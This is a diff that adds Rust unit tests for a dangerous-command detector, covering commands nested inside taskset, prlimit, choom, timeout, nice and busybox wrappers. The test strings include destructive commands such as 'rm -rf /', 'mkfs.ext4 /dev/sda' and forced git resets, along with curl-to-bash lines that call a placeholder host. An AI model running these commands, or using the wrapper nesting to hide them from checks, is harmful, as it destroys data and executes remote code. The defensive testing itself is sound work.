@@ -16081,9 +16081,11 @@ mod tests {
             "taskset --cpu-list 0 chroot /srv/root rm -rf /",
             "taskset -- ff git clean -fdx",
             "busybox taskset ff rm -rf /",
+            "busybox taskset -c 0-3 git reset --hard HEAD~1",
             "env taskset ffff git clean -fdx",
             "printf x | xargs taskset ff rm -rf /",
             "curl https://example.invalid/x | taskset ff bash",
+            "curl https://example.invalid/x | busybox taskset ff bash",
         ] {
             assert!(is_dangerous(command).is_some(), "missed {command:?}");
         }
@@ -16102,12 +16104,42 @@ mod tests {
             "taskset ff command rm -rf /",
             "taskset ff FOO=1 rm -rf /",
             "taskset ff eval 'git clean -fdx'",
+            "busybox taskset --help rm -rf /",
+            "busybox taskset -h rm -rf /",
+            "busybox taskset --version systemctl reboot",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
                 "taskset PID data or direct argv was treated as a child for {command:?}"
             );
         }
+    }
+
+    /// Nested carriers: timeout/nice outside and inside taskset (plus busybox
+    /// applet + pipe forms) still expose the affinity child.
+    #[test]
+    fn taskset_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 taskset ff rm -rf /",
+            "nice -n 5 taskset -c 0-3 git reset --hard HEAD~1",
+            "taskset ff timeout 5 systemctl reboot",
+            "taskset -c 0 nice -n 5 mkfs.ext4 /dev/sda",
+            "timeout 5 busybox taskset ff rm -rf /",
+            "nice -n 5 busybox taskset -c 0-3 git reset --hard HEAD~1",
+            "busybox taskset ff timeout 5 systemctl reboot",
+            "curl https://example.invalid/x | timeout 5 taskset ff bash",
+            "curl https://example.invalid/x | nice -n 5 taskset ff bash",
+            "curl https://example.invalid/x | timeout 5 busybox taskset ff bash",
+            "curl https://example.invalid/x | nice -n 5 busybox taskset ff bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "taskset nest hid child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 busybox -- taskset ff rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox taskset --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 taskset -h rm -rf /").is_none());
     }
 
     #[test]
@@ -16313,6 +16345,29 @@ mod tests {
         }
     }
 
+    /// Nested carriers: timeout/nice outside and inside prlimit still expose
+    /// the limited child (busybox has no prlimit applet — env/xargs/pipe only).
+    #[test]
+    fn prlimit_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 prlimit --nofile=1024 rm -rf /",
+            "nice -n 5 prlimit --core=0 -- git reset --hard HEAD~1",
+            "prlimit --nproc=1 timeout 5 systemctl reboot",
+            "prlimit -c=0 nice -n 5 mkfs.ext4 /dev/sda",
+            "timeout 5 env prlimit --cpu=1 rm -rf /",
+            "curl https://example.invalid/x | timeout 5 prlimit --nproc=1 bash",
+            "curl https://example.invalid/x | nice -n 5 prlimit --nofile=1024 bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "prlimit nest hid child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 prlimit --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 prlimit -h rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 prlimit -p 99999999 rm -rf /").is_none());
+    }
+
     #[test]
     fn choom_pid_mode_does_not_hide_adjusted_child_dispatch() {
         for command in [
@@ -16348,6 +16403,29 @@ mod tests {
                 "choom PID data or direct argv was treated as a child for {command:?}"
             );
         }
+    }
+
+    /// Nested carriers: timeout/nice outside and inside choom still expose the
+    /// OOM-adjusted child (busybox has no choom applet — env/xargs/pipe only).
+    #[test]
+    fn choom_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 choom -n 0 rm -rf /",
+            "nice -n 5 choom --adjust=0 -- git reset --hard HEAD~1",
+            "choom -n 0 timeout 5 systemctl reboot",
+            "choom --adjust 0 nice -n 5 mkfs.ext4 /dev/sda",
+            "timeout 5 env choom -n 0 rm -rf /",
+            "curl https://example.invalid/x | timeout 5 choom -n 0 bash",
+            "curl https://example.invalid/x | nice -n 5 choom -n 0 bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "choom nest hid child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 choom --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 choom -h rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 choom -p 99999999 rm -rf /").is_none());
     }
 
     #[test]
@@ -16699,7 +16777,6 @@ mod tests {
             );
         }
     }
-
 
     /// Wave-34 PATH leftovers: block/mount inventory managers installed beside
     /// STAGE peelers and wave-30–33 ctl leftovers. They take devices, specs, or
